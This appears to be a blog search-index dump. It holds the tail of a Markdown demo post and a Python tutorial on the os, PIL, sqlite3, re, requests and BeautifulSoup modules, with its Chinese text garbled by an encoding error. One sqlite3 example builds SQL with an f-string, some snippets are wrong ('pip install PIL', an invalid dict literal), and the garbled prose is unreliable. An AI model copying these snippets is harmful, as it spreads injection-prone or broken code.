Second item Third item Unordered List List item Another item And another item Nested list Fruit Apple Orange Banana Dairy Milk Cheese Other Elements â€” abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\nHyperlinked image The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2022-07-16T00:00:00Z","image":"https://wayneblog.ga/2022-07-16/markdown-syntax/pawel-czerwinski-8uZPynIu-rQ-unsplash_hud7e36f7e20e71be184458283bdae4646_55974_120x120_fill_q75_box_smart1.jpg","permalink":"https://wayneblog.ga/2022-07-16/markdown-syntax/","title":"Markdown èªæ³•æŒ‡å—"},{"content":" æŒ‡å°æ•™å¸«ï¼šæèŠæ¬Š(0921-763623) python(ç‰ˆæœ¬3.8.2) å®‰è£è‡³ç’°å¢ƒè®Šæ•¸(Windows10) Add Python 3.8 to PATH è‹¥æ²’å‹¾é¸ï¼Œéœ€è‡ªè¡Œåˆ°(ä»¥ä¸‹å…©ç¨®æ–¹å¼é€²å…¥ç’°å¢ƒè®Šæ•¸è¨­å®š)\næœ¬æ©Ÿ â–¸ å…§å®¹ æ§åˆ¶å° â–¸ ç³»çµ±åŠå®‰å…¨æ€§ â–¸ ç³»çµ±\né€²éšç³»çµ±è¨­å®š â–¸ ç³»çµ±å…§å®¹ â–¸ é€²éš â–¸ ç’°å¢ƒè®Šæ•¸\nå°‡python.exeç›®éŒ„æ–°å¢è‡³ç’°å¢ƒè®Šæ•¸\n(PATH â–¸ ç·¨è¼¯ â–¸ æ–°å¢) 1 2 3 4 5 6 7 8 9 ### python.exeé è¨­ä½ç½®(Windows10) C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ ### æ‰¾python.exe(Windows10) where python.exe \u0026gt; C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\python.exe ### å°‡ä»¥ä¸‹æ­¤æ®µè·¯å¾‘æ–°å¢è‡³ç’°å¢ƒè®Šæ•¸ ### C:\\Users\\user\\AppData\\Local\\Programs\\Python\\Python38-32\\ Pythonä»‹ç´¹ Python å‹•æ…‹å‹åˆ¥(å¼·å‹åˆ¥)/ç›´è­¯å¼èªè¨€ å‹•æ…‹å‹åˆ¥ï¼šä½¿ç”¨è®Šæ•¸æ™‚ä¸é ˆé å…ˆå®£å‘Šå‹åˆ¥ï¼Œä¾ç…§è¨­å®šä¹‹å€¼è€Œè®Šã€‚ å¼·å‹åˆ¥ï¼šä¸åŒå‹åˆ¥ç„¡æ³•é€²è¡Œé‹ç®—ã€‚ ç›´è­¯å¼èªè¨€ï¼šä¸é ˆç¶“éç·¨è­¯å³å¯ç›´æ¥åŸ·è¡Œã€‚ å‰¯æª”åï¼š.py IDLE pythonå®˜æ–¹æä¾›çš„IDE æ¨è–¦é–‹ç™¼ç’°å¢ƒ Anaconda Spyder - æ•´åˆé–‹ç™¼ç¨‹å¼ Python Shell (REPL) Python Shell (REPL) æ¨¡å¼\né€²å…¥Python Shell (REPL) 1 2 python \u0026gt;\u0026gt;\u0026gt; # é–‹é ­è®Šæˆ\u0026gt;\u0026gt;\u0026gt;ä»£è¡¨é€²å…¥python shell é›¢é–‹Python Shell (REPL) 1 quit() æ¸…é™¤ç•¶å‰Python Shell Screen 1 cls Python Plugin ä½œæ¥­ç³»çµ±æ¨¡çµ„ - os è¼‰å…¥æ¨¡çµ„ 1 import os # åŒ¯å…¥ç³»çµ±æ¨¡çµ„ æ‰“é–‹ç³»çµ±çš„æŒ‡å®šç¨‹å¼ - os.system(ç¨‹å¼å) 1 2 os.system(\u0026#34;mspaint\u0026#34;) # æ‰“é–‹å°ç•«å®¶ os.system(\u0026#34;calc\u0026#34;) # æ‰“é–‹è¨ˆç®—æ©Ÿ åˆ—å‡ºç›®éŒ„ä¸­æ‰€æœ‰æª”æ¡ˆ - os.listdir(è·¯å¾‘) 1 os.listdir(\u0026#34;./\u0026#34;) # ç•¶å‰ç›®éŒ„ å–å¾—ç•¶å‰ç›®éŒ„ - os.getcwd() 1 os.getcwd() æª¢æŸ¥ç›®éŒ„æ˜¯å¦å­˜åœ¨ - os.path.isdir(ç›®éŒ„è·¯å¾‘) 1 2 3 4 5 6 # æª¢æŸ¥ç•¶å‰ä½ç½®æ˜¯å¦å­˜åœ¨exportç›®éŒ„ testDir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(testDir): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) æª¢æŸ¥æª”æ¡ˆæ˜¯å¦å­˜åœ¨ - os.path.isfile(æª”æ¡ˆè·¯å¾‘) 1 2 3 4 5 6 # æª¢æŸ¥ç•¶å‰ä½ç½®æ˜¯å¦å­˜åœ¨text.txt testFile = os.getcwd() + \u0026#34;\\\\test.txt\u0026#34; if os.path.isfile(testFile): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) æª¢æŸ¥è·¯å¾‘æ˜¯å¦å­˜åœ¨ - os.path.exists(ç›®éŒ„è·¯å¾‘) 1 2 3 4 5 testPath = \u0026#34;\\\\etc\\\\hosts\u0026#34; if os.path.exists(testPath): print(\u0026#34;exist\u0026#34;) else: print(\u0026#34;not exist\u0026#34;) æ–¼æŒ‡å®šè·¯å¾‘å»ºç«‹ç›®éŒ„ - os.mkdir(è·¯å¾‘+ç›®éŒ„å) 1 2 3 4 # æª¢æŸ¥ç•¶å‰ç›®éŒ„æ˜¯å¦å­˜åœ¨exportç›®éŒ„ï¼Œæ²’æœ‰å‰‡å»ºç«‹ new_dir = os.getcwd() + \u0026#34;\\\\export\u0026#34; if os.path.isdir(new_dir) != True: os.mkdir(new_dir) å½±åƒè™•ç†æ¨¡çµ„ - PIL(Pillow) å®‰è£ PIL æ¨¡çµ„ 1 2 ### ä½¿ç”¨ pip å®‰è£ PIL æ¨¡çµ„ pip install PIL è¼‰å…¥æ¨¡çµ„ 1 from PIL import Image æ‰“é–‹åœ–æª” - .open(åœ–æª”è·¯å¾‘) 1 im = Image.open(\u0026#34;test.jpg\u0026#34;) å­˜æª” - .save(\u0026quot;æª”å\u0026quot;, \u0026ldquo;[æ ¼å¼]\u0026rdquo;, [quality = å£“ç¸®å€¼(é€šå¸¸è¨­å®š80æˆ–90)], [subsampling = 0]) 1 2 3 4 5 im = Image.open(\u0026#34;test.jpg\u0026#34;) # æ‰“é–‹åœ–æª” im.save(\u0026#34;test1.png\u0026#34;) # è½‰å­˜æˆpng # è½‰å­˜æˆpngä¸¦å£“ç¸®å“è³ª:80 im.save(\u0026#34;test2.png\u0026#34;, quality = 80, subsampling = 0) PILå¸¸ç”¨çš„åœ–æª”æ ¼å¼\næ ¼å¼ BMPã€EPSã€GIFã€JPEGã€JPGã€PNGã€TIFFã€PDF èª¿æ•´åœ–ç‰‡å°ºå¯¸ - .resize((å¯¬, é«˜) [, filter(æ¿¾æ³¢)è¨­å®š]) ä¸æœƒè‡ªå‹•ç­‰æ¯”ä¾‹ç¸®æ”¾ï¼Œéœ€ç­‰æ¯”ä¾‹ç¸®æ”¾å¾—è‡ªè¡Œè¨ˆç®—æ¯”ä¾‹ã€‚\n1 2 3 4 5 6 im = Image.open(\u0026#34;test.jpg\u0026#34;) # è¼‰å…¥åœ–ç‰‡ width = 400 # æŒ‡å®šå¯¬åº¦ç‚º 400px ratio = float(width)/im.size[0] # è¨ˆç®—é•·å¯¬æ¯” height = int(im.size[1]*ratio) # é«˜åº¦ä¾é•·å¯¬æ¯”è¨ˆç®—ä¸¦èª¿æ•´ nim = im.resize((width, height), Image.BILINEAR) nim.save(\u0026#34;test_resized.jpg\u0026#34;) # å¦å­˜èª¿æ•´å°ºå¯¸å¾Œçš„åœ–æª” æ¿¾æ³¢è¨­å®šå€¼\nfilter(æ¿¾æ³¢) èªªæ˜ NEAREST é è¨­æ¿¾æ³¢ï¼Œå¾è¼¸å…¥çš„åœ–æª”ä¸­é¸å–æœ€è¿‘çš„åƒç´ ä½œç‚ºè¼¸å‡ºåƒç´ ã€‚ BILINEAR é›™ç·šæ€§å…§æ’æ¿¾æ³¢ï¼Œå†è¼¸å…¥åœ–åƒçš„ 2*2 çŸ©é™£ä¸Šé€²è¡Œç·šæ€§æ’å€¼ã€‚ BICUBIC é›™ç«‹æ–¹æ¿¾æ³¢ï¼Œå†è¼¸å…¥åœ–åƒçš„ 4*4 çŸ©é™£ä¸Šé€²è¡Œç«‹æ–¹æ’å€¼ã€‚ ANTIALIAS å¹³æ»‘æ¿¾æ³¢ï¼Œå°æ‰€æœ‰å¯ä»¥å½±éŸ¿è¼¸å‡ºåƒç´ çš„è¼¸å…¥åƒç´ é€²è¡Œé«˜è³ªé‡çš„é‡æ¡æ¨£æ¿¾æ³¢ï¼Œä»¥è¨ˆç®—è¼¸å‡ºåƒç´ å€¼ã€‚ åœ–åƒç¹ªè£½å·¥å…· - turtle 1 2 3 4 5 6 7 8 9 import turtle # åŒ¯å…¥åœ–åƒç¹ªè£½å·¥å…·turtle turtle.showturtle() # æ‰“é–‹turtle turtle.forward(100) # turtleå¾€å‰100 turtle.left(90) # å·¦è½‰90åº¦ turtle.circle(30) # ç•«åŠå¾‘30çš„åœ“ turtle.reset() # é‡æ–°è¨­å®š turtle.goto(30,50) # ç§»å‹•åˆ°æŒ‡å®šåº§æ¨™ turtle.penup() # å°‡ç­†æèµ· turtle.pendown() # å°‡ç­†æ”¾ä¸‹ æ•¸å­—æ¨¡çµ„ - math 1 2 3 4 5 6 7 8 9 10 11 import math print(math.pi) # å–åœ“å‘¨ç‡ \u0026gt;\u0026gt;\u0026gt; 3.141592653589793 print(math.radians(45)) # å–å¼§åº¦45åº¦ \u0026gt;\u0026gt;\u0026gt; 0.7853981633974483 print(math.sin(math.radians(45))) # å–sin(45åº¦) \u0026gt;\u0026gt;\u0026gt; 0.7071067811865476 print(math.factorial(5)) # å–éšä¹˜(5ç‚º1*2*3*4*5) \u0026gt;\u0026gt;\u0026gt; 120 print(math.gcd(27, 9)) # å–æœ€å¤§å…¬å› æ•¸ \u0026gt;\u0026gt;\u0026gt; 9 äº‚æ•¸æ¨¡çµ„ - random 1 2 3 4 5 6 7 8 9 10 11 12 import random random.random() # å–0~1çš„éš¨æ©Ÿæ•¸ \u0026gt;\u0026gt;\u0026gt; 0.5672829418362756 random.randint(1, 10) # å–1~10çš„éš¨æ©Ÿæ•¸ \u0026gt;\u0026gt;\u0026gt; 4 K = [2,6,9,8,14,20,30] # å…ˆè¨­å®šä¸€å€‹é™£åˆ— random.shuffle(K) # æ‰“äº‚é™£åˆ—æ’åˆ—(ç›´æ¥æ“ä½œè©²é™£åˆ—) print(K) \u0026gt;\u0026gt;\u0026gt; [30, 9, 2, 6, 14, 20, 8] æµ®é»æ•¸ç²¾åº¦æ¨¡çµ„ - Decimal 1 2 3 4 5 6 7 print(0.1+0.1+0.1) \u0026gt;\u0026gt;\u0026gt; 0.30000000000000004 # ä½¿ç”¨Decimalæ¨¡çµ„ä¾†é¿å…æµ®é»æ•¸ç²¾åº¦å•é¡Œ from decimal import Decimal print(Decimal(\u0026#34;0.1\u0026#34;)*3) \u0026gt;\u0026gt;\u0026gt; 0.3 æŠ“DOSæ¨¡å¼å¾Œæ–¹åƒæ•¸çš„æ¨¡çµ„ - sys 1 2 3 # sysArgv.py import sys print(sys.argv) 1 2 3 # æ–¼DOSæ¨¡å¼åŸ·è¡ŒsysArgv.pyä¸¦æ–¼å¾Œæ–¹å¸¶åƒæ•¸Aã€Bã€C python sysArgv.py A B C \u0026gt;\u0026gt;\u0026gt; [\u0026#39;sysArgv.py\u0026#39;, \u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;] è³‡æ–™åº«æ¨¡çµ„ - sqlite3 è¼‰å…¥æ¨¡çµ„ 1 import sqlite3 é€£æ¥è³‡æ–™åº« - .connect() è³‡æ–™åº«é€£çµ.connect(è³‡æ–™åº«åç¨±) 1 2 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) CursoræŒ‡æ¨™æŒ‡åˆ°è³‡æ–™åº«(ä»¥ä¾¿ä½¿ç”¨è³‡æ–™åº«ç‰©ä»¶æ“ä½œè³‡æ–™åº«) - .cursor() è³‡æ–™åº«ç‰©ä»¶ = è³‡æ–™åº«é€£çµ.cursor() 1 2 3 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() åŸ·è¡ŒSQLèªæ³• - .execute() è³‡æ–™åº«ç‰©ä»¶.execute(SQLèªæ³•) 1 2 3 4 5 6 7 8 9 10 11 12 import sqlite3 conn = sqlite3.connect(\u0026#34;test.sqlite\u0026#34;) cursor = conn.cursor() SQL = \u0026#34;CREATE TABLE IF NOT EXISTS UserScore(\u0026#39;Name\u0026#39; Text, \u0026#39;Score\u0026#39; Integer)\u0026#34; cursor.execute(SQL) # ä½¿ç”¨è®Šæ•¸ name = \u0026#39;Wayne\u0026#39; Score = 80 SQL = f\u0026#34;INSERT INTO UserScore VALUES(\u0026#39;{name}\u0026#39;, {Score})\u0026#34; cursor.execute(SQL) æäº¤ç•¶å‰çš„SQLäº‹å‹™(åŸ·è¡Œå®ŒSQLéœ€ä½¿ç”¨æ­¤å‡½å¼æäº¤) - .commit() è³‡æ–™åº«é€£çµ.commit() 1 2 conn.commit() conn.close() å–å¾—æ‰€æœ‰è³‡æ–™ - .fetchall() è³‡æ–™åº«ç‰©ä»¶.fetchall() 1 2 3 4 5 6 7 8 9 10 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) rows = cursor.fetchall() for row in rows: # formatæ ¼å¼åŒ–è³‡æ–™å‹æ…‹ print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(row[0], row[1], row[2])) å–å¾—å–®ç­†è³‡æ–™ - .fetchone() è³‡æ–™åº«ç‰©ä»¶.fetchone() 1 2 3 4 5 6 7 8 9 import sqlite3 conn = sqlite3.connect(\u0026#34;test042601.sqlite3\u0026#34;) cursor = conn.cursor() SQL = \u0026#39;SELECT * FROM UserData;\u0026#39; cursor.execute(SQL) line = cursor.fetchone() if not line == None: print(\u0026#34;{}\\t{}\\t{}\u0026#34;.format(line[0], line[1], line[2])) æ­£è¦è¡¨é”å¼æ¨¡çµ„ - re ä»¥å°å¯«ré–‹é ­å†æ¥å­—ä¸²ï¼Œä¾‹å¦‚ï¼šr\u0026quot;\\d\u0026quot;ã€r\u0026quot;0-9\u0026quot; è¦å‰‡å¯«æ³• èªªæ˜ ç¯„ä¾‹ {} å€‹æ•¸ \\d{4}-\\d{6}ï¼šå°ç£é›»è©±è™Ÿç¢¼æ ¼å¼0000-000000ç‚ºç¬¦åˆ {n,} è‡³å°‘å‡ºç¾næ¬¡ X{2,}ï¼šXè‡³å°‘å‡ºç¾2æ¬¡æ‰ç¬¦åˆ ` ` æˆ– \\d ä»»æ„æ•¸å­— \\dï¼š0-9ç‚ºç¬¦åˆ - åˆ° 1-5ï¼š1 ~ 5ç‚ºç¬¦åˆ,a-zï¼ša ~ zç‚ºç¬¦åˆ ^ å¦å®š ^aeiouï¼šéa,e,i,o,uç‚ºç¬¦åˆ . å­—å…ƒ .ï¼šå­—å…ƒçš†ç¬¦åˆ,ç¬¦è™Ÿé¡(ä¾‹å¦‚ï¼š\\n)ä¸ç¬¦åˆ * é‡è¤‡å‰ä¸€å€‹å­—å…ƒ0~ç„¡é™å¤šæ¬¡éƒ½ç¬¦åˆ err*ï¼šerrã€errrã€errrr\u0026hellip;ç­‰éƒ½ç‚ºç¬¦åˆ ? å‰ä¸€å€‹å­—å…ƒå¯æœ‰å¯ç„¡çš†ç¬¦åˆ colou?rï¼šcolorã€colourçš†ç‚ºç¬¦åˆ + å‰ä¸€å€‹å­—å…ƒè¦ä¸€æ¬¡ä»¥ä¸Šæ‰ç¬¦åˆ er+ï¼šerä¸ç¬¦åˆ,errã€errr\u0026hellip;ç­‰æ‰ç¬¦åˆ $ 1.ä½æ•¸ç”±å¾Œå¾€å‰åŒ¹é… 2.ç‚ºçµå°¾æ‰åŒ¹é… [1-9]\\d$ï¼š1 ~ 99çš†ç‚ºç¬¦åˆ,100ä¸ç¬¦åˆ () 1.åƒ…æ”¶é›†æ‹¬è™Ÿå…§çš„å…§å®¹ 2.åˆ†çµ„åˆ¥ä»¥ä¾¿.group(çµ„åˆ¥)å¯ä»¥ç›´æ¥æŠ“åˆ°å€¼ r'\u0026lt;h3 class=\u0026quot;LC20lb DKV0Md\u0026quot;\u0026gt;(.*?)\u0026lt;/h3\u0026gt;'ï¼šåƒ…å›å‚³\u0026lt;h3\u0026gt;å…§çš„æ–‡å­— \\b é‚Šç•Œ,ç‚ºé‚Šç•Œå‰‡ç¬¦åˆ dog\\bï¼š\u0026lsquo;dog \u0026lsquo;ç¬¦åˆ,\u0026lsquo;dog\u0026rsquo;ä¸ç¬¦åˆ \\æ•¸å­— åˆ†çµ„å‘å‰åƒè€ƒ è²ªå©ª/é€æ­¥é‡è© (*/?) è²ªå©ªé‡è© - *:0æ¬¡~ç„¡é™æ¬¡çš†ç¬¦åˆã€‚ 1 2 3 re.match(r\u0026#34;\u0026lt;.*\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;å¤§å®¶å¥½\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt;å¤§å®¶å¥½\u0026lt;/h3\u0026gt; é€æ­¥é‡è© - ?:å›å‚³æœ€çŸ­çš„é‡è©ã€‚ 1 2 3 re.match(r\u0026#34;\u0026lt;.*?\u0026gt;\u0026#34;, \u0026#34;\u0026lt;h3\u0026gt;å¤§å®¶å¥½\u0026lt;/h3\u0026gt;\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;h3\u0026gt; è¼‰å…¥æ¨¡çµ„ 1 import re åˆ†å‰²å­—ä¸² - re.split(æ­£å‰‡, åˆ†å‰²çš„å­—ä¸²) 1 2 3 print(re.split(\u0026#39;\\d\u0026#39;, \u0026#34;Andy1Ben2Cathy\u0026#34;)) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;Andy\u0026#39;, \u0026#39;Ben\u0026#39;, \u0026#39;Cathy\u0026#39;] å–ä»£å­—å…ƒ - re.sub(æ­£å‰‡, æ¬²å–ä»£çš„å­—å…ƒ, å­—ä¸²) 1 2 3 re.sub(\u0026#34;\\d\u0026#34;, \u0026#34;-\u0026#34;, \u0026#34;Andy1Ben2Cathy\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Andy-Ben-Cathy\u0026#39; åŒ¹é…å­—å…ƒ - re.match(æ¬²åŒ¹é…çš„æ–‡å­—, å­—ä¸²) 1 2 3 re.match(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; å°‹æ‰¾å­—å…ƒ(æ‰¾ç¬¬ä¸€å€‹) - re.search(æ¬²å°‹æ‰¾çš„æ–‡å­—, å­—ä¸²) 1 2 3 re.search(\u0026#34;yahoo\u0026#34;, \u0026#34;yahoo.com.tw\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;re.Match object; span=(0, 5), match=\u0026#39;yahoo\u0026#39;\u0026gt; å°‹æ‰¾å­—å…ƒ(æ‰¾æ‰€æœ‰) - re.findall(æ¬²å°‹æ‰¾çš„æ–‡å­—, å­—ä¸²) 1 2 3 re.findall(\u0026#39;\\d{4}-\\d{6}\u0026#39;, \u0026#34;jjladpoiwlkj 0800-123456 hjkpojas 0921-456873\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026#39;0800-123456\u0026#39;, \u0026#39;0921-456873\u0026#39;] æŠ“htmlæ¨¡çµ„ - requests è¼‰å…¥æ¨¡çµ„ 1 import requests GET æŠ“å–æª”æ¡ˆ - .get(ç¶²å€) 1 response = requests.get(\u0026#34;https://www.baidu.com/\u0026#34;) GET å¯å¸¶çš„åƒæ•¸(éœ€ä½¿ç”¨é—œéµå­—åƒæ•¸) èªªæ˜ headers è«‹æ±‚çš„headers params åƒæ•¸ cookies clientçš„cookies æŠ“å–æ¨™é ­(head) - .head(ç¶²å€) 1 2 # .head() -\u0026gt; åªæŠ“æ¨™é ­ reshead = requests.head(\u0026#34;https://www.baidu.com/\u0026#34;) ç‹€æ…‹ç¢¼ - status_code 1 2 3 print(response.status_code) \u0026gt;\u0026gt;\u0026gt; 200 # 200ç‚ºæ­£å¸¸é€£ç·š ç·¨ç¢¼æ ¼å¼ - encoding 1 2 3 4 5 print(response.encoding) \u0026gt;\u0026gt;\u0026gt; \u0026#39;ISO-8859-1\u0026#39; # è½‰ç·¨ç¢¼ç‚ºutf-8 response.encoding = \u0026#34;utf-8\u0026#34; htmlå…§å®¹ - text 1 2 3 print(response.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;\u0026lt;!DOCTYPE html\u0026gt;\\r\\n\u0026lt;!--STATUS OK--\u0026gt;\u0026lt;html\u0026gt;...\u0026#39; response headers - headers 1 2 3 print(response.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;Server\u0026#39;: \u0026#39;Baby Web Server\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;, \u0026#39;Content-Length\u0026#39;: \u0026#39;467\u0026#39;, \u0026#39;Set-Cookie\u0026#39;: \u0026#39;SESSIONID=00000006; path=/;version=1\u0026#39;, \u0026#39;Date\u0026#39;: \u0026#39;Sun, 03 May 2020 10:41:58 GMT\u0026#39;} request headers - request.headers å…¶ä¸­çš„User-Agentç›¸ç•¶é‡è¦ï¼Œç”¨ä¾†åˆ¤æ–·ä½¿ç”¨è€…çš„ç›¸é—œè³‡è¨Šç”¨ï¼Œçˆ¬èŸ²èˆ‡åçˆ¬èŸ²é€šå¸¸ä½¿ç”¨æ­¤åƒæ•¸ã€‚ 1 2 3 print(response.request.headers) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;User-Agent\u0026#39;: \u0026#39;python-requests/2.22.0\u0026#39;, \u0026#39;Accept-Encoding\u0026#39;: \u0026#39;gzip, deflate\u0026#39;, \u0026#39;Accept\u0026#39;: \u0026#39;*/*\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39;} æŠ“åœ–ç‰‡æª” é–‹æª”æ ¼å¼ä½¿ç”¨wb:äºŒé€²ä½æ ¼å¼å¯«å…¥ w:å¯«å…¥ / b:äºŒé€²ä½æ ¼å¼ 1 2 3 4 5 6 7 8 import requests res = requests.get(\u0026#34;https://www.natgeomedia.com/userfiles/PhotoContest/771/sm1100/2019091450912553.jpg\u0026#34;) photo = res.content # w:å¯«å…¥/b:äºŒé€²ä½æ ¼å¼ \u0026#34;wb\u0026#34; =\u0026gt; äºŒé€²ä½æ ¼å¼å¯«å…¥ with open(\u0026#34;img01.jpg\u0026#34;, \u0026#34;wb\u0026#34;) as file: file.write(photo) å¸¶request headerçš„è«‹æ±‚ å…ˆå¾ä¸€èˆ¬ç€è¦½å™¨å–å¾—header(user-agent) éœ€ä½¿ç”¨é—œéµå­—åƒæ•¸ 1 2 3 4 5 # å¾ç€è¦½å™¨çš„é–‹ç™¼è€…å·¥å…·å–å¾—æ­£å¸¸çš„request headersè³‡æ–™ headers = {\u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34;} # åœ¨å¾Œæ–¹å¸¶å…¥é—œéµå­—åƒæ•¸headers res = requests.get(\u0026#34;http://google.com.tw\u0026#34;, headers = headers) POST POST å¯å¸¶çš„åƒæ•¸(éœ€ä½¿ç”¨é—œéµå­—åƒæ•¸) èªªæ˜ data form dataè«‹æ±‚çš„data headers è«‹æ±‚çš„headers cookies clientçš„cookies POSTå­˜Session - .Session() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 data = { \u0026#34;from\u0026#34;: \u0026#34;/bbs/Gossiping/index.html\u0026#34;, \u0026#34;yes\u0026#34;: \u0026#34;yes\u0026#34; } headers = { \u0026#34;user-agent\u0026#34;: \u0026#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36\u0026#34; } # å…ˆä½¿ç”¨POSTå–å¾—æ»¿18æ­²çš„é©—è­‰ä¸¦å­˜æ”¾ç½®sessionå…§ rs = requests.Session() rs.post(\u0026#34;https://www.ptt.cc/ask/over18\u0026#34;, data = data, headers = headers) # éæ»¿18æ­²çš„é©—è­‰å¾Œä½¿ç”¨getå–å¾—ç¶²é å…§å®¹ response = rs.get(\u0026#34;https://www.ptt.cc/bbs/Gossiping/index.html\u0026#34;, headers = headers) è§£æ\u0026amp;ç¾åŒ–HTMLæ¨¡çµ„ - BeautifulSoup4 è¼‰å…¥æ¨¡çµ„ 1 from bs4 import BeautifulSoup BeautifulSoup4çš„åŸºæœ¬å…ƒç´ è¡¨ åŸºæœ¬å…ƒç´  èªªæ˜ tag æ¨™ç±¤ï¼šæœ€åŸºæœ¬çš„ä¿¡æ¯çµ„ç¹”å–®ä½ï¼Œåˆ†åˆ¥ç”¨\u0026lt;\u0026gt;å’Œ\u0026lt;/\u0026gt;æ¨™æ˜é–‹é ­èˆ‡çµå°¾ã€‚ name æ¨™ç±¤åç¨±ï¼š\u0026lt;p\u0026gt;...\u0026lt;/p\u0026gt;çš„åå­—æ˜¯pï¼Œæ ¼å¼ï¼š\u0026lt;tag\u0026gt;.nameã€‚ Attributes å±¬æ€§ï¼š\u0026lt;tag\u0026gt;.attrsï¼Œdictå‹å¼ã€‚ NavigatString å…§å®¹ï¼š\u0026lt;tag\u0026gt;.stringã€‚ Comment è¨»é‡‹ï¼šæ¨™ç±¤å…§å­—ç¬¦ä¸²çš„è¨»é‡‹éƒ¨åˆ†ï¼Œä¸€ç¨®ç‰¹æ®Šçš„Commenté¡å‹ã€‚ è§£æ - .BeautifulSoup(html, \u0026lsquo;html.parser\u0026rsquo;) 1 2 3 4 5 6 7 8 9 10 demo = \u0026#34;\u0026#34;\u0026#34; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt;\u0026lt;title\u0026gt;This is a python demo page\u0026lt;/title\u0026gt;\u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;p class=\u0026#34;course\u0026#34;\u0026gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses: \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; class=\u0026#34;py1\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; and \u0026lt;a href=\u0026#34;http://www.icourse163.org/course/BIT-1001870001\u0026#34; class=\u0026#34;py2\u0026#34; id=\u0026#34;link2\u0026#34;\u0026gt;Advanced Python\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; \u0026#34;\u0026#34;\u0026#34; soup = BeautifulSoup(demo, \u0026#39;html.parser\u0026#39;) ç¾åŒ– - .prettify() 1 print(soup.prettify()) å–å¾—å±¬æ€§ - .attrs 1 2 3 4 5 print(soup.a.attrs) \u0026gt;\u0026gt;\u0026gt; {\u0026#39;href\u0026#39;: \u0026#39;http://www.icourse163.org/course/BIT-268001\u0026#39;, \u0026#39;class\u0026#39;: [\u0026#39;py1\u0026#39;], \u0026#39;id\u0026#39;: \u0026#39;link1\u0026#39;} å–å¾—tagå…§å®¹ - .string/.text 1 2 3 4 5 print(soup.a.string) print(soup.a.text) \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; \u0026gt;\u0026gt;\u0026gt; \u0026#39;Basic Python\u0026#39; æ‰¾ç¬¬ä¸€å€‹æ¨™ç±¤ - .find(\u0026quot;æ¨™ç±¤\u0026quot;) 1 2 3 soup.find(\u0026#34;a\u0026#34;) \u0026gt;\u0026gt;\u0026gt; \u0026lt;a class=\u0026#34;py1\u0026#34; href=\u0026#34;http://www.icourse163.org/course/BIT-268001\u0026#34; id=\u0026#34;link1\u0026#34;\u0026gt;Basic Python\u0026lt;/a\u0026gt; æ‰¾å…¨éƒ¨çš„æ¨™ç±¤ - .find_all(\u0026quot;æ¨™ç±¤\u0026quot;, class_=\u0026quot;className\u0026quot;) å¯åŠ ä¸Šclassåšç¯©é¸æ¢ä»¶ã€‚ 1 2 3 4 5 6 7 8 9 # å¯«æ³•1ï¼š soup.find_all(\u0026#34;p\u0026#34;, class_=\u0026#34;title\u0026#34;) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python courses.\u0026lt;/b\u0026gt;\u0026lt;/p\u0026gt;] # å¯«æ³•2ï¼š soup.find_all(\u0026#34;p\u0026#34;, {\u0026#34;class\u0026#34;=\u0026#34;title\u0026#34;}) \u0026gt;\u0026gt;\u0026gt; [\u0026lt;p class=\u0026#34;title\u0026#34;\u0026gt;\u0026lt;b\u0026gt;The demo python introduces several python 